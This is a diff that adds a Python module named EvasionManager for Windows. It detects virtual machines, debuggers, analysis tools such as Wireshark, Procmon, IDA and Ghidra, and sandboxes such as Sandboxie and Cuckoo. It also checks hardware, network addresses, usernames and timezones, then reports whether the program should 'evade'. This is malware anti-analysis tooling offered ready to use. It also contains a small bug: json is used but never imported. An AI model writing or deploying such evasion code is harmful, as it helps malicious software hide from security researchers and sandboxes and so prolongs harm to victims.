@@ -1,0 +1,397 @@
+import os
+import sys
+import ctypes
+import time
+import random
+import string
+import subprocess
+import platform
+import socket
+import uuid
+from datetime import datetime
+from typing import Dict, List, Any, Optional, Tuple
+
+try:
+    import psutil
+except ImportError:
+    pass
+
+try:
+    import wmi
+except ImportError:
+    pass
+
+try:
+    import win32api
+    import win32con
+    import win32process
+    import win32security
+    import win32event
+    import win32gui
+except ImportError:
+    pass
+
+__version__ = "1.0.0"
+
+class EvasionManager:
+    def __init__(self, config=None):
+        self.config = config or {}
+        self.wmi_connection = None
+        self.vm_indicators = []
+        self.debugger_detected = False
+        self.analysis_tools_detected = []
+        
+        try:
+            self.wmi_connection = wmi.WMI()
+        except:
+            pass
+    
+    def check_vm(self):
+        vm_detected = False
+        
+        # Check for VM indicators
+        vm_indicators = [
+            "vbox", "vmware", "qemu", "virtual", "hyper-v", "parallels",
+            "innotek", "oracle", "xen", "kvm"
+        ]
+        
+        # Check system info
+        try:
+            system_info = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode().lower()
+            
+            for indicator in vm_indicators:
+                if indicator in system_info:
+                    self.vm_indicators.append(f"systeminfo: {indicator}")
+                    vm_detected = True
+        except:
+            pass
+        
+        # Check WMI
+        try:
+            if self.wmi_connection:
+                for disk in self.wmi_connection.Win32_DiskDrive():
+                    model = str(disk.Model).lower()
+                    for indicator in vm_indicators:
+                        if indicator in model:
+                            self.vm_indicators.append(f"disk: {indicator}")
+                            vm_detected = True
+                            break
+                
+                for computer in self.wmi_connection.Win32_ComputerSystem():
+                    manufacturer = str(computer.Manufacturer).lower()
+                    model = str(computer.Model).lower()
+                    
+                    for indicator in vm_indicators:
+                        if indicator in manufacturer or indicator in model:
+                            self.vm_indicators.append(f"system: {indicator}")
+                            vm_detected = True
+                            break
+        except:
+            pass
+        
+        # Check MAC address
+        try:
+            mac = uuid.getnode()
+            mac_str = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
+            
+            vm_mac_prefixes = [
+                "00:0c:29",  # VMware
+                "00:1c:14",  # VMware
+                "00:50:56",  # VMware
+                "00:05:69",  # VMware
+                "08:00:27",  # VirtualBox
+                "00:16:3e",  # Xen
+                "00:15:5d",  # Hyper-V
+                "00:03:ff",  # VirtualPC
+                "00:0f:4b"   # Virtual Iron
+            ]
+            
+            for prefix in vm_mac_prefixes:
+                if mac_str.startswith(prefix):
+                    self.vm_indicators.append(f"mac: {prefix}")
+                    vm_detected = True
+                    break
+        except:
+            pass
+        
+        # Check for VM processes
+        vm_processes = [
+            "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
+            "vboxservice.exe", "vboxtray.exe", "vboxclient.exe",
+            "xenservice.exe", "qemu-ga.exe"
+        ]
+        
+        try:
+            for proc in psutil.process_iter(['name']):
+                if proc.info['name'] and proc.info['name'].lower() in vm_processes:
+                    self.vm_indicators.append(f"process: {proc.info['name']}")
+                    vm_detected = True
+        except:
+            pass
+        
+        # Check for VM files
+        vm_files = [
+            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
+            "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
+            "C:\\Windows\\System32\\drivers\\vmci.sys",
+            "C:\\Windows\\System32\\drivers\\vboxguest.sys",
+            "C:\\Windows\\System32\\drivers\\vboxsf.sys"
+        ]
+        
+        for vm_file in vm_files:
+            if os.path.exists(vm_file):
+                self.vm_indicators.append(f"file: {vm_file}")
+                vm_detected = True
+        
+        return vm_detected
+    
+    def check_debugger(self):
+        debugger_detected = False
+        
+        # Check IsDebuggerPresent
+        try:
+            if ctypes.windll.kernel32.IsDebuggerPresent():
+                debugger_detected = True
+        except:
+            pass
+        
+        # Check CheckRemoteDebuggerPresent
+        try:
+            remote_debugger = ctypes.c_bool(False)
+            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(remote_debugger))
+            
+            if remote_debugger.value:
+                debugger_detected = True
+        except:
+            pass
+        
+        # Check PEB
+        try:
+            process_heap = ctypes.windll.kernel32.GetProcessHeap()
+            
+            if process_heap:
+                flags = ctypes.c_ulong()
+                ctypes.windll.ntdll.RtlGetProcessHeaps(1, ctypes.byref(flags))
+                
+                if flags.value > 2:
+                    debugger_detected = True
+        except:
+            pass
+        
+        # Check for debugger processes
+        debugger_processes = [
+            "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "immunitydebugger.exe",
+            "windbg.exe", "ida.exe", "ida64.exe", "ghidra.exe", "radare2.exe"
+        ]
+        
+        try:
+            for proc in psutil.process_iter(['name']):
+                if proc.info['name'] and proc.info['name'].lower() in debugger_processes:
+                    debugger_detected = True
+                    break
+        except:
+            pass
+        
+        self.debugger_detected = debugger_detected
+        return debugger_detected
+    
+    def check_analysis_tools(self):
+        analysis_tools = [
+            "wireshark.exe", "procmon.exe", "processhacker.exe", "processexplorer.exe",
+            "tcpview.exe", "autoruns.exe", "fiddler.exe", "regmon.exe", "filemon.exe",
+            "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "immunitydebugger.exe",
+            "windbg.exe", "ida.exe", "ida64.exe", "ghidra.exe", "radare2.exe",
+            "cuckoo.exe", "anyrun.exe", "joebox.exe"
+        ]
+        
+        try:
+            output = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode().lower()
+            
+            for tool in analysis_tools:
+                if tool in output:
+                    self.analysis_tools_detected.append(tool)
+        except:
+            pass
+        
+        return len(self.analysis_tools_detected) > 0
+    
+    def check_sandbox(self):
+        sandbox_detected = False
+        
+        # Check for sandbox indicators
+        sandbox_indicators = [
+            "sandboxie", "cuckoo", "any.run", "joebox", "anubis",
+            "malwr", "hybrid-analysis", "virus total", "virustotal"
+        ]
+        
+        # Check processes
+        try:
+            for proc in psutil.process_iter(['name']):
+                if proc.info['name']:
+                    proc_name = proc.info['name'].lower()
+                    for indicator in sandbox_indicators:
+                        if indicator in proc_name:
+                            sandbox_detected = True
+                            break
+        except:
+            pass
+        
+        # Check for sandbox DLLs
+        sandbox_dlls = [
+            "sbiedll.dll", "api_log.dll", "dir_watch.dll", "pstorec.dll"
+        ]
+        
+        for dll in sandbox_dlls:
+            try:
+                dll_path = os.path.join(os.getenv("SystemRoot"), "System32", dll)
+                if os.path.exists(dll_path):
+                    sandbox_detected = True
+                    break
+            except:
+                pass
+        
+        return sandbox_detected
+    
+    def check_hardware(self):
+        issues = []
+        
+        # Check RAM
+        try:
+            total_ram = psutil.virtual_memory().total
+            min_ram = self.config.get("min_ram_gb", 4) * 1024 * 1024 * 1024
+            
+            if total_ram < min_ram:
+                issues.append(f"low_ram: {total_ram}")
+        except:
+            pass
+        
+        # Check CPU cores
+        try:
+            cpu_count = psutil.cpu_count()
+            min_cores = self.config.get("min_cores", 2)
+            
+            if cpu_count < min_cores:
+                issues.append(f"low_cores: {cpu_count}")
+        except:
+            pass
+        
+        # Check screen resolution
+        try:
+            screen_width = win32api.GetSystemMetrics(0)
+            screen_height = win32api.GetSystemMetrics(1)
+            
+            min_width = self.config.get("min_width", 800)
+            min_height = self.config.get("min_height", 600)
+            
+            if screen_width < min_width or screen_height < min_height:
+                issues.append(f"low_resolution: {screen_width}x{screen_height}")
+        except:
+            pass
+        
+        # Check disk size
+        try:
+            disk_usage = psutil.disk_usage("C:\\")
+            min_disk = 50 * 1024 * 1024 * 1024  # 50 GB
+            
+            if disk_usage.total < min_disk:
+                issues.append(f"small_disk: {disk_usage.total}")
+        except:
+            pass
+        
+        return issues
+    
+    def check_network(self):
+        issues = []
+        
+        try:
+            hostname = socket.gethostname()
+            ip_address = socket.gethostbyname(hostname)
+            
+            # Check for suspicious IPs
+            suspicious_ips = [
+                "10.0.2.15",  # VirtualBox
+                "192.168.56.101",  # VirtualBox
+                "192.168.122.1"  # QEMU/KVM
+            ]
+            
+            if ip_address in suspicious_ips:
+                issues.append(f"suspicious_ip: {ip_address}")
+        except:
+            pass
+        
+        return issues
+    
+    def check_username(self):
+        suspicious_usernames = [
+            "sandbox", "virus", "malware", "test", "user", "admin",
+            "analysis", "cuckoo", "anyrun", "joebox"
+        ]
+        
+        try:
+            username = os.getenv("USERNAME", "").lower()
+            
+            for suspicious in suspicious_usernames:
+                if suspicious in username:
+                    return True
+        except:
+            pass
+        
+        return False
+    
+    def check_timezone(self):
+        try:
+            import time
+            timezone = time.tzname
+            
+            suspicious_timezones = ["UTC", "GMT"]
+            
+            for tz in timezone:
+                if tz in suspicious_timezones:
+                    return True
+        except:
+            pass
+        
+        return False
+    
+    def run_all_checks(self):
+        results = {
+            "vm_detected": False,
+            "debugger_detected": False,
+            "analysis_tools_detected": False,
+            "sandbox_detected": False,
+            "hardware_issues": [],
+            "network_issues": [],
+            "suspicious_username": False,
+            "suspicious_timezone": False
+        }
+        
+        # Run checks
+        results["vm_detected"] = self.check_vm()
+        results["debugger_detected"] = self.check_debugger()
+        results["analysis_tools_detected"] = self.check_analysis_tools()
+        results["sandbox_detected"] = self.check_sandbox()
+        results["hardware_issues"] = self.check_hardware()
+        results["network_issues"] = self.check_network()
+        results["suspicious_username"] = self.check_username()
+        results["suspicious_timezone"] = self.check_timezone()
+        
+        # Determine if should evade
+        should_evade = (
+            results["vm_detected"] or
+            results["debugger_detected"] or
+            results["analysis_tools_detected"] or
+            results["sandbox_detected"] or
+            len(results["hardware_issues"]) > 0 or
+            len(results["network_issues"]) > 0 or
+            results["suspicious_username"] or
+            results["suspicious_timezone"]
+        )
+        
+        results["should_evade"] = should_evade
+        
+        return results
+
+if __name__ == "__main__":
+    evasion = EvasionManager()
+    results = evasion.run_all_checks()
+    print(json.dumps(results, indent=2, default=str))
